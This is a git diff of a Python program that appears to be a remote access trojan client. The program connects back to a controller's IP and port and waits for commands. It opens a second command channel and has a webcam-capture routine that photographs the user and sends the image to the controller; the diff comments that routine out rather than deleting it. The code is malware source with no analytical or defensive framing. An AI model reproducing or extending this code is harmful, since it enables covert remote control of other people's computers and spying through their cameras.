@@ -7,7 +7,7 @@ import socket
 from subprocess import Popen, PIPE
 import sys
 import shutil
-from cv2 import VideoCapture, imwrite
+# from cv2 import VideoCapture, imwrite
 # import win32api
 # import win32con
 # import win32gui
@@ -27,26 +27,26 @@ def PINGPONG_client(ip, port):
                 s.close()
                 CMD_client(ip, cmd_port, port)
                 break
-            if data.decode() == "CAM_SHOT_APP":
-                os.mkdir("./temp")
-                s.send(bytes("OK", 'utf8'))
-                cap = VideoCapture(0)
-                while True:
-                    f, frame = cap.read()
-                    imwrite("./temp/image.jpg", frame)
-                    cap.release()
-                    break
-                with open("./temp/image.jpg", "rb") as f:
-                    img_data = f.read()
-                len_data = len(img_data)
-                s.send(bytes(str(len_data), 'utf8'))
-                check = s.recv(1024)
-                if check:
-                    s.sendall(img_data)
-                re_check = s.recv(1024)
-                shutil.rmtree("./temp")
-                if re_check:
-                    continue
+            # if data.decode() == "CAM_SHOT_APP":
+            #     os.mkdir("./temp")
+            #     s.send(bytes("OK", 'utf8'))
+            #     cap = VideoCapture(0)
+            #     while True:
+            #         f, frame = cap.read()
+            #         imwrite("./temp/image.jpg", frame)
+            #         cap.release()
+            #         break
+            #     with open("./temp/image.jpg", "rb") as f:
+            #         img_data = f.read()
+            #     len_data = len(img_data)
+            #     s.send(bytes(str(len_data), 'utf8'))
+            #     check = s.recv(1024)
+            #     if check:
+            #         s.sendall(img_data)
+            #     re_check = s.recv(1024)
+            #     shutil.rmtree("./temp")
+            #     if re_check:
+            #         continue
             if data.decode() == "EXIT_APP":
                 s.close()
                 break
@@ -96,7 +96,7 @@ def CMD_client(ip, port, main_port):
         try:
             cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             cmd_c.connect((ip, port))
-        except socket.error as msg:
+        except socket.error:
             sys.exit(1)
         while True:
             cmd_command = cmd_c.recv(1024)
